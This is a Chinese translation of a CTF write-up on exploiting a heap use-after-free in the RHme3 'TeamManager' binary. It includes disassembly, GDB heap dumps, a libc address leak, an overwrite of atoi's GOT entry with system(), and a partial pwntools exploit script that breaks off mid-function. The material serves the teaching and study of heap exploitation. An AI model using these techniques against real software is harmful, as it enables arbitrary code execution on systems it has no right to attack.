# 【技术分享】堆利用——UAF之殇

阅读量 **232665**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-09-29 10:08:55

 **x**

##### 译文声明

本文是翻译文章，文章来源：0x00sec.org

原文地址：<https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[天鸽](http://bobao.360.cn/member/contribute?uid=145812086)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

  

**前言**

距离我上次的 CTF write-up 已经很久了。主要原因是我正在努力掌握堆利用的方法。我将使用 **RHme3** CTF
的一个二进制文件来展示一种现代化的基于堆的二进制漏洞利用方法。要想掌握堆利用，一篇 write-up 是不够的，我在下面列出了一些资源，可以帮助你掌握
malloc 和 free 等的算法。请记住，堆利用是很困难的，不要期望能在前十到二十次尝试之前掌握它。

**Glibc Malloc Internals**

**Heap Exploitation**

**二进制文件回顾**

首先运行二进制文件。

    
    
    Welcome to your TeamManager (TM)!
    0.- Exit
    1.- Add player
    2.- Remove player
    3.- Select player
    4.- Edit player
    5.- Show player
    6.- Show team
    Your choice:

我们看到了上面的菜单。一般来说，CTF 中大多数的堆 pwnable 都是一个菜单驱动的二进制文件。

弄清楚二进制文件的功能后，得出下面的结论：

为了组建一个球队，我们要先创建球员。每个球员都是这样的一个结构体。

    
    
    struct player {
         int32_t attack_pts;
         int32_t defense_pts;
         int32_t speed;
         int32_t precision;
         char *name;
    }

我们可以显示、转储和编辑球队或球员的信息。

我们可以从球队中删除球员。

为了能执行上面两个操作，我们需要先通过输入一个索引来选择球员。这一点很重要。

下面我们开始反汇编。

**  
**

**逆向工程**

我将专注于二进制文件的核心功能。

**球员分配：**

堆 pwnable 的 go-to 函数用于给对象分配内存。（在这里指一个球员）。

**提示 1** ：请注意，我们不需要对整个二进制文件进行逆向。通过静态分析快速地了解二进制文件，然后大部分时间都在动态分析。

**提示 2** ：大多数基于堆的二进制文件需要跟踪动态分配的对象。为了做到这一点，通常有一个全局的结构体指针数组。

在 addPlayer 函数的开头我们得到了两行汇编代码：

    
    
    00401848  mov     rax, qword [rax*8+0x603180]
    00401850  test    rax, rax

让我们做一些假设。

从地址 0x603180 中我们能读取到的内容取决于 rax 的值。这是典型的数组索引。

正如提示 2 中所说的，程序需要跟踪那些已分配内存的对象。所以这里会包含一个对该数组值的内容的检查，以确定其是否为空（NULL）。

由于它是一个内存分配函数，它很可能先给一个新对象分配内存，然后将其指针存储在某个数组索引中，索引的值取决于检查的结果。

在函数的最后且退出之前有下面这行代码：

    
    
    00401af8  mov     qword [rax*8+0x603180], rdx

它使用了相同的索引方法，但这次在索引指向的条目中存入的是 rax 的值。我认为对象分配的执行方式如下：

检查全局数组中是否有可用于分配的条目。

如果检查的结果是有，则向用户询问球员的信息。

用户输入后，把新分配球员的地址存入全局数组。

**球员选择：**

在启动 GDB 之前，我们来看一下球员选择的函数。直觉告诉我，这里可能有一个 bug。

    
    
    00401c8b  mov     eax, dword [rbp-0x14]
    00401c8e  mov     rax, qword [rax*8+0x603180]
    00401c96  mov     qword [rel selected], rax

eax 寄存器从偏移 rbp-0x14 处的局部变量中获得值。

eax 确实是作为该全局数组的索引。

rax 保存了该数组元素的内容（在这里指球员对象的地址），并且 eax 被存储在另一个被称作 selected 的全局变量的地址中。

虽然该二进制文件不是 stripped 的，但在 stripped 的情况下，也是一样的。

**  
**

**动态分析**

首先，我们来看看球员分配在 GDB 中是怎样执行的。

    
    
    def alloc(name, attack = 1, 
              defense = 2, speed = 3, precision = 4):
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('name: ')
        p.sendline(name)
        p.recvuntil('points: ')
        p.sendline(str(attack))
        p.recvuntil('points: ')
        p.sendline(str(defense))
        p.recvuntil('speed: ')
        p.sendline(str(speed))
        p.recvuntil('precision: ')
        p.sendline(str(precision))
        return
    def pwn():
        alloc('A'*0x60)
                                  (gdb) x/80gx 0x604000
           actual player chunk --> 0x604000:    0x0000000000000000    0x0000000000000021
    Pointer returned by malloc --> 0x604010:    0x0000000200000001    0x0000000400000003
           player's name chunk --> 0x604020:    0x0000000000604030    0x0000000000000071
                                   0x604030:    0x4141414141414141    0x4141414141414141
                                   0x604040:    0x4141414141414141    0x4141414141414141
                                   0x604050:    0x4141414141414141    0x4141414141414141
                                   0x604060:    0x4141414141414141    0x4141414141414141
                                   0x604070:    0x4141414141414141    0x4141414141414141
                                   0x604080:    0x4141414141414141    0x4141414141414141
                     top chunk --> 0x604090:    0x0000000000000000    0x0000000000020f71

在这里我们分配了一个新的球员。从上图中可以看出，球员对象默认被分配的大小为 0x20（最后一位被设置时表示前一个 chunk
正在使用中），对象的名字（大小为 0x60）被一个 malloc 指针指向的一个新分配的 chunk 专门存储。

让我们继续下一次分配。

    
    
    alloc('B'*0x60)
    (gdb) x/80gx 0x604000
    0x604000:    0x0000000000000000    0x0000000000000021  <-- player 0
    0x604010:    0x0000000200000001    0x0000000400000003
    0x604020:    0x0000000000604030    0x0000000000000071
    0x604030:    0x4141414141414141    0x4141414141414141
    0x604040:    0x4141414141414141    0x4141414141414141
    0x604050:    0x4141414141414141    0x4141414141414141
    0x604060:    0x4141414141414141    0x4141414141414141
    0x604070:    0x4141414141414141    0x4141414141414141
    0x604080:    0x4141414141414141    0x4141414141414141
    0x604090:    0x0000000000000000    0x0000000000000021 <-- player 1
    0x6040a0:    0x0000000200000001    0x0000000400000003
    0x6040b0:    0x00000000006040c0    0x0000000000000071
    0x6040c0:    0x4242424242424242    0x4242424242424242
    0x6040d0:    0x4242424242424242    0x4242424242424242
    0x6040e0:    0x4242424242424242    0x4242424242424242
    0x6040f0:    0x4242424242424242    0x4242424242424242
    0x604100:    0x4242424242424242    0x4242424242424242
    0x604110:    0x4242424242424242    0x4242424242424242
    0x604120:    0x0000000000000000    0x0000000000020ee1 <-- top chunk

因为数组索引从 0 开始，所以我使用球员 0 作为第一个球员，以此类推。

    
    
    alloc('C'*0x80)
    alloc('D'*0x80)
    (gdb) x/90gx 0x604000
    0x604000:    0x0000000000000000    0x0000000000000021 <-- player 0
    0x604010:    0x0000000200000001    0x0000000400000003
    0x604020:    0x0000000000604030    0x0000000000000071
    0x604030:    0x4141414141414141    0x4141414141414141
    0x604040:    0x4141414141414141    0x4141414141414141
    0x604050:    0x4141414141414141    0x4141414141414141
    0x604060:    0x4141414141414141    0x4141414141414141
    0x604070:    0x4141414141414141    0x4141414141414141
    0x604080:    0x4141414141414141    0x4141414141414141
    0x604090:    0x0000000000000000    0x0000000000000021 <-- player 1
    0x6040a0:    0x0000000200000001    0x0000000400000003
    0x6040b0:    0x00000000006040c0    0x0000000000000071
    0x6040c0:    0x4242424242424242    0x4242424242424242
    0x6040d0:    0x4242424242424242    0x4242424242424242
    0x6040e0:    0x4242424242424242    0x4242424242424242
    0x6040f0:    0x4242424242424242    0x4242424242424242
    0x604100:    0x4242424242424242    0x4242424242424242
    0x604110:    0x4242424242424242    0x4242424242424242
    0x604120:    0x0000000000000000    0x0000000000000021 <-- player 2
    0x604130:    0x0000000200000001    0x0000000400000003
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x4343434343434343    0x4343434343434343
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x0000000000000000    0x0000000000000021 <-- player 3
    0x6041e0:    0x0000000200000001    0x0000000400000003
    0x6041f0:    0x0000000000604200    0x0000000000000091
    0x604200:    0x4444444444444444    0x4444444444444444
    0x604210:    0x4444444444444444    0x4444444444444444
    0x604220:    0x4444444444444444    0x4444444444444444
    0x604230:    0x4444444444444444    0x4444444444444444
    0x604240:    0x4444444444444444    0x4444444444444444
    0x604250:    0x4444444444444444    0x4444444444444444
    0x604260:    0x4444444444444444    0x4444444444444444
    0x604270:    0x4444444444444444    0x4444444444444444
    0x604280:    0x0000000000000000    0x0000000000020d81 <-- top chunk

这是用于保存球员结构体指针的全局数组：

    
    
    (gdb) x/4gx 0x603180
    0x603180 <players>:       0x0000000000604010    0x00000000006040a0
    0x603190 <players+16>:    0x0000000000604130    0x00000000006041e0

很好，我们正式创建了一支球队。下面我们来 pwn 它！

**  
**

**UAF 漏洞**

堆有关于内存的分配和释放。如果一个被释放的内存没有被正确地管理，就可能发生信息泄露，甚至是任意代码执行。我们来看一下，在删除一个球员时，实际发生了什么。

    
    
     [...]
    /* index */
    00401b9c  mov     eax, dword [rbp-0x1c]
    /* player struct pointer */
    00401b9f  mov     rax, qword [rax*8+0x603180] 
    00401ba7  mov     qword [rbp-0x18], rax
    00401bab  mov     eax, dword [rbp-0x1c]
    /* Mitigate double-free, good shit */
    00401bae  mov     qword [rax*8+0x603180], 0x0 
    00401bba  mov     rax, qword [rbp-0x18]
    /* player's name pointer */
    00401bbe  mov     rax, qword [rax+0x10]      
    00401bc2  mov     rdi, rax
    00401bc5  call    free
    /* player's chunk */
    00401bca  mov     rax, qword [rbp-0x18]   
    00401bce  mov     rdi, rax
    00401bd1  call    free
                 [...]

首先被释放的是球员的名字，然后是球员本身的 chunk。回想一下，当我们想要 show 一个球员之前，必须先 select
它。但是，上面的汇编代码并不会将全局变量 selected 清零。这是一个重要的逻辑错误，它意味着即使球员已经被释放，我们仍然可以打印出球员的信息。

show 函数的工作：

    
    
    /* Global variable holding a player pointer */
                 [...]
    004020f2  mov     rax, qword [rel selected] 
    004020f9  mov     rdi, rax
    004020fc  call    show_player_func
                 [...]

正如你看到的，它接收变量 selected 的内容作为一个参数，而该参数是一个球员结构体的指针。

**  
**

**堆崩溃简介**

在现代操作系统中，ASLR 是（或应该是）被开启的。为了得到 shell，我们需要用 sh 作为参数来调用 system()。我们事先并不知道
system() 的地址，但可以先泄露某个 libc 函数的地址，帮助我们计算出 libc 的基址，然后根据偏移得到 system()
的地址。所有这一切，都要感谢 Use-After-Free 漏洞。

在开始之前，我们先回顾下关于 malloc 和 free 处理 chunk 知识。

Malloc 根据 chunk 大小的不同来管理它们。

    
    
    struct malloc_chunk {
      INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;                /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
    malloc chunk
        chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of previous chunk, if unallocated (P clear)  |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of chunk, in bytes                     |A|M|P|
          mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             User data starts here...                          .
                .                                                               .
                .             (malloc_usable_size() bytes)                      .
                .                                                               |
    nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             (size of chunk, but used for application data)    |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of next chunk, in bytes                |A|0|1|
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    free chunk
        chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of previous chunk, if unallocated (P clear)  |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        `head:' |             Size of chunk, in bytes                     |A|0|P|
          mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Forward pointer to next chunk in list             |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Back pointer to previous chunk in list            |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Unused space (may be 0 bytes long)                .
                .                                                               .
                .                                                               |
    nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        `foot:' |             Size of chunk, in bytes                           |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of next chunk, in bytes                |A|0|0|
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

有三种核心的 chunk 类型：

**Fast chunks – 表示小尺寸的 chunk**

**Small chunks – 表示尺寸不是那么小的 chunk**

**Large chunks – 表示尺寸相当庞大的 chunk**

当一个 chunk 被释放时，它被保存到一个列表里。该列表可能是单链表或循环双链表。但不是所有类型的 chunk
都被放在同一个列表中。基本上，就是那些被叫做 fast bin、small bin、unsorted bin 和 large bin 的 chunk。

**Fast bins：**

总共有 10 个 fast bin。这些 bins 中的每一个都维护着一个单链表。添加和删除操作发生在该列表的头部（LIFO）。两个相邻的空闲 fast
chunk 不会被合并在一起。

**Small bins：**

总共有 62 个 small bin。small bin 的速度比 large bin 要快，但比 fast bin 要慢。每一个 bin
维护一个双链表。插入操作发生在链表的头部，而删除操作发生在尾部（FIFO）。small chunk 如果以 unsorted bin
结尾，则可能被合并在一起。

**Large bins：**

总共有 63 个 large bin。每个 bin 维护着一个双链表。一个特定的 large bin 具有不同大小的 chunk，以递减顺序排列（即最大的
chunk 在头部而最小的 chunk 在尾部）。插入和删除操作可以发生在链表的任何地方。large chunk 如果以 unsorted bin
结尾，则可能被合并在一起。

**Unsorted bin：**

unsorted bin 只有一个。当 small chunk 和 large chunk 被释放时，以该 bin 作为结尾。该 bin
的主要作用是充当一个“缓冲层（cache layer）”，以加快内存分配和释放请求的速度。

**Top Chunk：**

它是作为一个 arena 上边界的 chunk。它是处理 malloc 请求时最后的操作。

**UAF 漏洞**

现在我们已经分配了 4 名球员，下面我们来泄露 libc 函数的地址。

    
    
    select(2)
    free(2)
    (gdb) x/80gx 0x604000
    0x604000:    0x0000000000000000    0x0000000000000021 <-- player 0 [in use]
    0x604010:    0x0000000200000001    0x0000000400000003
    0x604020:    0x0000000000604030    0x0000000000000071
    0x604030:    0x4141414141414141    0x4141414141414141
    0x604040:    0x4141414141414141    0x4141414141414141
    0x604050:    0x4141414141414141    0x4141414141414141
    0x604060:    0x4141414141414141    0x4141414141414141
    0x604070:    0x4141414141414141    0x4141414141414141
    0x604080:    0x4141414141414141    0x4141414141414141
    0x604090:    0x0000000000000000    0x0000000000000021 <-- player 1 [in use]
    0x6040a0:    0x0000000200000001    0x0000000400000003
    0x6040b0:    0x00000000006040c0    0x0000000000000071
    0x6040c0:    0x4242424242424242    0x4242424242424242
    0x6040d0:    0x4242424242424242    0x4242424242424242
    0x6040e0:    0x4242424242424242    0x4242424242424242
    0x6040f0:    0x4242424242424242    0x4242424242424242
    0x604100:    0x4242424242424242    0x4242424242424242
    0x604110:    0x4242424242424242    0x4242424242424242
    0x604120:    0x0000000000000000    0x0000000000000021 <-- player 2 [free]
    0x604130:    0x0000000000000000    0x0000000400000003
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8 
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343

球员 2 被正式释放了，但它的名字指针依然指向相同的区域。我们把球员 2 的信息挑出来。

    
    
    0x604120:    0x0000000000000000    0x0000000000000021 <-- player 2 [free]
    0x604130:    0x0000000000000000    0x0000000400000003
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x0000000000000090    0x0000000000000020 <-- player 3 [in use]
    0x6041e0:    0x0000000200000001    0x0000000400000003
    0x6041f0:    0x0000000000604200    0x0000000000000091

请注意：球员 3 表示大小的 chunk 从 0x21 变为 x020。malloc 就是通过这样将最低有效位置 0 的方式，判断前面的 chunk
是否为空。

Libc 中有一个叫做 main_arena 的数据结构。这个结构体中存储着 bin 列表的头和尾。

**Fastbin 列表**

    
    
    typedef struct malloc_chunk *mfastbinptr;
    // Array of pointers to chunks
    mfastbinptr fastbinsY[];
    unsorted / small / large bins 列表：
    typedef struct malloc_chunk* mchunkptr;
    // Array of pointers to chunks
    mchunkptr bins[];

换句话说，libc 根据 chunks 的大小将其指针存储在不同的数组中，从而对已分配的 chunks
进行跟踪。实际上，每个条目都是一个单（或双）链表，它包含了指向不同大小的 chunk 的指针。fastbin 列表的第一个条目指向一个大小为 16 的空闲
chunk。fastbin 列表的第二个条目指向大小为 24 的空闲 chunk，以此类推。unsorted、small、large bin 也是一样的。

请注意，这些 bin 列表将 chunk 指针存储在它们各自的条目中，但都有一个相应大小的边界。就像一个 fast bin 列表不能指向一个 small
chunk 大小的 chunk 一样。

让我们回到球员 2。它的名字指针指向了一个 small chunk 大小的 chunk。一旦前一个和后一个 chunk 被释放，它的 fd 和 bk
将被分别赋予指向两个空闲 chunk 的指针。由于是第一个被释放的 chunk，它的指针都指向一个相同的位置，即 libc。

    
    
    (gdb) heapinfoall 
    ==================  Main Arena  ==================
    (0x20)     fastbin[0]: 0x604120 --> 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
                      top: 0x604280 (size : 0x20d80) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x604140 (size : 0x90)

看起来我没有说错，球员的 chunk 确实被放入它相应的 fastbin 列表中，而球员的名字 chunk 被放入 unsorted bin 中。

利用这个程序的逻辑，就可以泄露这些 libc 值（无论 libc 的基址怎么变化，偏移总是不变的）。

    
    
    (gdb) x/gx 0x603170
    0x603170 <selected>:    0x0000000000604130

正如你上面看到的，即使我们释放了玩家 2，它的地址依然保存在 selected 变量中。如果我们现在调用 show 函数，将读取 selected
变量中的地址，并打印出其内容。

    
    
    # The 'selected' array contains the 3rd player object
    # We are abusing the UAF vuln to leak libc
    # show_player just checks if the 'selected' array is empty
    # if it's not, it will print the value of the player's object
    # without checking if it's actually free'd or not
    show()
    p.recvuntil('Name: ')
    leak        = u64(p.recv(6).ljust(8, 'x00'))
    libc        = leak - 0x3c17b8
    system      = libc + 0x46590
    log.info("Leak:   0x{:x}".format(leak))
    log.info("Libc:   0x{:x}".format(libc))
    log.info("system: 0x{:x}".format(system))
    [*] Leak:   0x7ffff7dd37b8
    [*] Libc:   0x7ffff7a12000
    [*] system: 0x7ffff7a58590

于是我们成功泄露出了指向 main_arena 的指针并得到了 libc 的基址。下面就 pwn 掉这个二进制程序吧。

  

**Pwning Time**

现在的问题时，我们如何执行任意代码？继续往下看。

    
    
    # Consolidate with top chunk
    free(3)
    0x604120:    0x0000000000000000    0x00000000000000b1 <-- player 2 [free]
    0x604130:    0x00007ffff7dd37b8    0x00007ffff7dd37b8
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x00000000000000b0    0x0000000000000020 <-- player 3 [free]
    0x6041e0:    0x0000000000000000    0x0000000400000003
    0x6041f0:    0x0000000000604200    0x0000000000020e11 <-- top chunk

malloc 会整合所有相邻的空闲 chunk，并根据合并后的大小更新这些 chunk 的尺寸值，这就意味着有更多的可用空间可以分配。

    
    
    (0x20)     fastbin[0]: 0x6041d0 --> 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
                      top: 0x6041f0 (size : 0x20e10) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x604120 (size : 0xb0)

现在考虑以下几点。下一次分配会发生什么？

每个球员对象的默认大小为 0x20，根据我们输入的长度，chunk 的大小会有不同。

当我们分配了一个新的 chunk 时，malloc 将根据请求的尺寸检查相应的 bin 列表，查看是否有同等大小的可用 chunk。这就是所谓的
first-fit behavior。记住，在 fastbin 删除和添加操作都发生在列表的头部。换句话说，球员的信息被存储在 0x6041d0
处，因为它是一个符合 0x20 大小的空闲 fastbin chunk。

unsorted bin 保存了地址 0x604120。那是球员 2 chunk 的地址。这与 free(3) 执行之前的地址不一样。因为 malloc
合并了相邻的空闲 chunk，所以必须更新地址。用于检查相邻 chunk 的代码如下：

    
    
    /* consolidate backward */
    if (!prev_inuse(p)) {
          prevsize = p->prev_size;
          size += prevsize;
          p = chunk_at_offset(p, -((long) prevsize));
          /* Classic double-linked list unlinking */
          unlink(av, p, bck, fwd);
    }

无论我们输入的名字有多长（不能大于目前 unsorted bin 列表中的 chunk 大小，在这里是 0xb0），都应该返回地址 0x604120
以储存它。如果小于 0xb0，则给定的 chunk 会被拆分开。

但是这里的 0x604120 就是球员 2 的 chunk 地址，所以我们可以构造 payload 来覆写它的数据。因为球员 2 仍然在变量
selected 中，所以我们能将它打印或者修改等等。如果我们用一个自己选择的指针（GOT 条目）来覆写原来的指针，然后使用它调用 edit
函数，将能够重定向代码的执行。

让我们来验证这些假设。

    
    
    # Overwrite 3rd player's (index 2) name pointer with atoi
    # in order to edit it with system's address
    alloc('Z'*8 * 2 + p64(atoi_got))
    edit(p64(system))

我选择 GOT 里的 atoi 函数来覆写 。原因是 atoi 接收一个指向我们输入的指针，然后将其转换回整数。如果将 atoi 换成 system
函数，并提供 sh 作为 system 的参数，就能得到 shell。

    
    
    0x604120:    0x0000000000000000    0x0000000000000021 <-- new player's name [old player 2]
    0x604130:    0x5a5a5a5a5a5a5a5a    0x5a5a5a5a5a5a5a5a
    0x604140:    0x0000000000603110    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x0000000000000090    0x0000000000000020 <-- new allocated player
    0x6041e0:    0x0000000200000001    0x0000000400000003
    0x6041f0:    0x0000000000604130

我们所有的假设都被证实了。0x6041d0 确实是存储新球员信息的地址，而 0x604120 是存储球员名字的地址。我们成功地利用 atoi 的 GOT
条目覆写了球员 2 的原始名字指针。通过 edit 函数，我们用 system 的地址替换 atoi 的地址，一旦调用了 atoi
将我们的输入转换为整数，这个游戏就结束了！

    
    
    Exploit / PoC
    from pwn import *
    atoi_got = 0x603110
    def alloc(name, attack = 1, 
              defense = 2, speed = 3, precision = 4):
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('name: ')
        p.sendline(name)
        p.recvuntil('points: ')
        p.sendline(str(attack))
        p.recvuntil('points: ')
        p.sendline(str(defense))
        p.recvuntil('speed: ')
        p.sendline(str(speed))
        p.recvuntil('precision: ')
        p.sendline(str(precision))
        return
    def edit(name):
        p.recvuntil('choice: ')
        p.sendline('4')
        p.recvuntil('choice: ')
        p.sendline('1')
        p.recvuntil('name: ')
        p.sendline(name)
        p.recvuntil('choice: ')
        p.sendline('sh')
        return
    def select(idx):
        p.recvuntil('choice: ')
        p.sendline('3')
        p.recvuntil('index: ')
        p.sendline(str(idx))
      &nbsp

本文翻译自0x00sec.org [原文链接](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ChatSecurity** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86952](/post/id/86952)

安全客 - 有思想的安全新媒体

本文转载自: [0x00sec.org](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)

如若转载,请注明出处： <https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __3赞

 __收藏

![](https://p3.ssl.qhimg.com/t011395e65a405bb14f.png) ChatSecurity

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

